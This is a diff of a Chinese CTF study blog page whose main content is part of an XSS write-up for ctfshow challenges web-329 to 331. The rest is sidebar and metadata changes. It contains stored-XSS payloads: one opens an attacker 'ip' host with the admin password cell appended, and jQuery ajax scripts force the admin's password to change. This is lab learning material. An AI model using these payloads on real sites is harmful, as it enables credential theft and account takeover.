@@ -6,17 +6,28 @@
   <meta name="keywords" content=" 学习笔记 , xss ">
   <meta name="description" content="ctfshow-xss | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="ctfshow-php反序列化web-254先看题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-sqli-labs">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/03/08/ctfshow-sqli-labs/index.html">
+<meta property="og:title" content="ctfshow-php序列化">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="ctfshow-php反序列化web-254先看题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-03-08T09:51:18.000Z">
-<meta property="article:modified_time" content="2025-03-08T09:51:47.470Z">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png">
+<meta property="article:published_time" content="2025-03-14T14:11:16.000Z">
+<meta property="article:modified_time" content="2025-03-16T09:12:50.376Z">
 <meta property="article:author" content="MIXBP">
 <meta property="article:tag" content="学习笔记">
-<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="php反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -115,7 +126,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(28)</small>
+                <small>(35)</small>
             
         </div>
     </li>
@@ -150,8 +161,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="28">
-<input type="hidden" id="yelog_site_word_count" value="68.7k">
+<input type="hidden" id="yelog_site_posts_number" value="35">
+<input type="hidden" id="yelog_site_word_count" value="86.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -197,11 +208,23 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>堆叠注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>命令执行</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>刷题笔记</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -257,6 +280,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
             </li>
         
@@ -270,6 +297,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>waf绕过</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -293,8 +324,71 @@
         
         
         <a  class="All "
+           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,php反序列化"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
+            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/GXYCTF2019-BabySQli1/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
+            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
+           data-tag="刷题笔记,文件包含,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
+            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
+            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
+           data-tag="刷题笔记,命令执行,waf绕过"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
+            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
+           data-tag="刷题笔记,sql注入,报错注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
+            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
+           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
+            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
            href="/2025/03/08/ctfshow-sqli-labs/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
             <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
@@ -303,7 +397,7 @@
         
         <a  class="All "
            href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
             <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
@@ -393,7 +487,7 @@
         
         <a  class="All "
            href="/2025/01/29/ctfshow-web82/"
-           data-tag="做题笔记,文件包含"
+           data-tag="文件包含,做题笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
             <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
@@ -447,7 +541,7 @@
         
         <a  class="All "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
-           data-tag="做题笔记,http协议"
+           data-tag="刷题笔记,http协议"
            data-author="" >
             <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
             <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
@@ -456,7 +550,7 @@
         
         <a  class="All "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
-           data-tag="做题笔记,filter伪协议"
+           data-tag="刷题笔记,filter伪协议"
            data-author="" >
             <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
             <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
@@ -465,7 +559,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
-           data-tag="做题笔记,sql注入"
+           data-tag="刷题笔记,sql注入"
            data-author="" >
             <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
             <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
@@ -474,7 +568,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
-           data-tag="做题笔记,payload构造"
+           data-tag="刷题笔记,payload构造"
            data-author="" >
             <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
             <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
@@ -483,7 +577,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
-           data-tag="做题笔记,sql注入"
+           data-tag="刷题笔记,sql注入"
            data-author="" >
             <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
             <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
@@ -492,7 +586,7 @@
         
         <a  class="All "
            href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="sql注入">sql注入</span>
             <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
@@ -582,12 +676,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-03-04 16:14:10'>2025-02-23 17:12</time>
+            Created At : <time class="date" title='Updated At: 2025-03-12 21:39:53'>2025-02-23 17:12</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.3k</span>
+        <span>Count:2.4k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -617,7 +711,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-xss"><span class="toc-text">web-xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-316%EF%BC%88%E6%97%A0%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-316（无过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-317%EF%BC%88script%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-317（script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-318%EF%BC%88img%EF%BC%8Cscript%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-318（img，script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-319%EF%BC%88body%EF%BC%8Cscript%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-319（body，script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-320%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-320（空格过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-321"><span class="toc-text">web-321</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-322%EF%BC%88xss%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-322（xss过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-323-326"><span class="toc-text">web-323-326</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-327%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98cookie%E8%8E%B7%E5%8F%96%EF%BC%89"><span class="toc-text">web-327（管理员cookie获取）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-328%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98cookie%E8%8E%B7%E5%8F%96%E7%9B%97%E7%94%A8%EF%BC%89"><span class="toc-text">web-328（管理员cookie获取盗用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-329"><span class="toc-text">web-329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-330"><span class="toc-text">web-330</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-331"><span class="toc-text">web-331</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-332"><span class="toc-text">web-332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-333"><span class="toc-text">web-333</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web-xss"><span class="toc-text">web-xss</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-text">反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-316%EF%BC%88%E6%97%A0%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-text">web-316（无过滤）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-317%EF%BC%88script%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-317（script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-318%EF%BC%88img%EF%BC%8Cscript%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-318（img，script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-319%EF%BC%88body%EF%BC%8Cscript%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-319（body，script过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-320%EF%BC%88%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-320（空格过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-321"><span class="toc-text">web-321</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-322%EF%BC%88xss%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-322（xss过滤绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-323-326"><span class="toc-text">web-323-326</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-text">存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-327%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98cookie%E8%8E%B7%E5%8F%96%EF%BC%89"><span class="toc-text">web-327（管理员cookie获取）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-328%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98cookie%E8%8E%B7%E5%8F%96%E7%9B%97%E7%94%A8%EF%BC%89"><span class="toc-text">web-328（管理员cookie获取盗用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-329%EF%BC%88%E9%80%9A%E8%BF%87%E7%B1%BB%E5%90%8D%E6%9F%A5%E6%89%BE%E5%85%83%E7%B4%A0%EF%BC%8C%E9%80%9A%E8%BF%87document%E8%8E%B7%E5%8F%96%EF%BC%89"><span class="toc-text">web-329（通过类名查找元素，通过document获取）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-330%EF%BC%88xss%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%EF%BC%88get%E6%96%B9%E6%B3%95%EF%BC%89%EF%BC%89"><span class="toc-text">web-330（xss修改管理员密码（get方法））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-331%EF%BC%88xss%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%EF%BC%88post%E6%96%B9%E6%B3%95%EF%BC%89%EF%BC%89"><span class="toc-text">web-331（xss修改管理员密码（post方法））</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-332"><span class="toc-text">web-332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-333"><span class="toc-text">web-333</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -686,7 +780,7 @@
 <p><strong>注意：这里cookie是会变化的，所以要快，而且要用最新的cookie,这里有点恶心，我试了很多次才成功</strong></p>
 <p><strong>好像在重放器里就不用这么麻烦了。</strong></p>
 <p><img src="/../image/web-xss-7.png"></p>
-<h2 id="web-329"><a href="#web-329" class="headerlink" title="web-329"></a>web-329</h2><p>依旧利用cookie，这题也能得到cookie，但是cookie一下就会失效,原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
+<h2 id="web-329（通过类名查找元素，通过document获取）"><a href="#web-329（通过类名查找元素，通过document获取）" class="headerlink" title="web-329（通过类名查找元素，通过document获取）"></a>web-329（通过类名查找元素，通过document获取）</h2><p>依旧利用cookie，这题也能得到cookie，但是cookie一下就会失效,原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
 <p>我们可以通过类名查找元素，通过document来获取</p>
 <p>可以看到前端代码中将要显示admin密码的地方类为<code>layui-table-cell laytable-cell-1-0-1</code></p>
 <p><img src="/../image/web-xss-8.png"></p>
@@ -695,7 +789,7 @@
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">window<span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;http://ip/&#x27;</span> + document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span class="hljs-selector-attr">[1]</span>.innerHTML) 这是一个调用 window<span class="hljs-selector-class">.open</span>() 函数的语句，用于打开新的浏览器窗口。<br><br><span class="hljs-string">&#x27;http://ip/&#x27;</span> 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:<span class="hljs-comment">//）、主机名（ip）和端口号（80），以及路径（后面的斜杠 /）。</span><br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>)<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.innerHTML</span> 这是一系列 DOM 操作，用于获取网页中特定元素的内容。<br><br>document<span class="hljs-selector-class">.getElementsByClassName</span>(<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span>) 是一个通过类名查找元素的方法。它查找具有类名<span class="hljs-string">&#x27;laytable-cell-1-0-1&#x27;</span> 的元素，通常这是一种针对表格单元格的选择。<br><br><span class="hljs-selector-attr">[1]</span> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 <span class="hljs-number">0</span> 开始）。<br><br><span class="hljs-selector-class">.innerHTML</span> 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。<br><span class="hljs-number">1</span>、innerHTML:<br>　　从对象的起始位置到终止位置的全部内容,不包括Html标签。<br>innerText可替代innerHTML<br><span class="hljs-number">2</span>、outerHTML:<br>　　除了包含innerHTML的全部内容外, 还包含对象标签本身。<br></code></pre></td></tr></table></figure>
 
 <p>其他方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">https://blog.csdn.net/Jayjay___/article/details/133375048</a></p>
-<h2 id="web-330"><a href="#web-330" class="headerlink" title="web-330"></a>web-330</h2><p>这题的登录页面多了个修改密码的功能，这题的思路就是我们注入一个xss，让管理员触发自动修改他的密码，这样我们就能登录了</p>
+<h2 id="web-330（xss修改管理员密码（get方法））"><a href="#web-330（xss修改管理员密码（get方法））" class="headerlink" title="web-330（xss修改管理员密码（get方法））"></a>web-330（xss修改管理员密码（get方法））</h2><p>这题的登录页面多了个修改密码的功能，这题的思路就是我们注入一个xss，让管理员触发自动修改他的密码，这样我们就能登录了</p>
 <p>我们注册一个普通账号，然后再修改密码时抓包</p>
 <p>可以看到修改密码文件路径为<code>/api/change.php?p=</code>而且这里是使用GET方法来发送数据</p>
 <p><img src="/../image/web-xss-9.png"></p>
@@ -707,9 +801,9 @@
 <p><img src="/../image/web-xss-10.png"></p>
 <p>这时候会出现一种情况，我们在管理员账号上一点击<code>用户管理</code>，立马跳转到api，来不及复制flag。这是因为我们的XSSpayload是一个用户账号，管理员每次访问<code>用户管理</code>都会解析它。</p>
 <p>解决办法：立刻Ctrl+u查看源码或者抓包。</p>
-<h2 id="web-331"><a href="#web-331" class="headerlink" title="web-331"></a>web-331</h2><p>修改密码从GET方法变成了POST方法，其他的都没变，将payload修改成post请求即可</p>
+<h2 id="web-331（xss修改管理员密码（post方法））"><a href="#web-331（xss修改管理员密码（post方法））" class="headerlink" title="web-331（xss修改管理员密码（post方法））"></a>web-331（xss修改管理员密码（post方法））</h2><p>修改密码从GET方法变成了POST方法，其他的都没变，将payload修改成post请求即可</p>
 <p>jQuery 提供的 Ajax 方法，用于向服务器发送异步 HTTP 请求</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">p</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">$.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;http://d76df70b-08d6-47a1-9faf-d9582a5e5ff3.node5.buuoj.cn/change&#x27;</span>,<span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-attr">data</span>:&#123;<span class="hljs-string">&#x27;newpassword&#x27;</span>:<span class="hljs-string">&#x27;2439&#x27;</span>&#125;&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>url：发送路径，type：发送类型，data：数据</p>
 <h2 id="web-332"><a href="#web-332" class="headerlink" title="web-332"></a>web-332</h2><p>这题多了很多功能，比如转账，个人账户，购买flag，从题目来看需要我们有足够的钱才能购买flag</p>
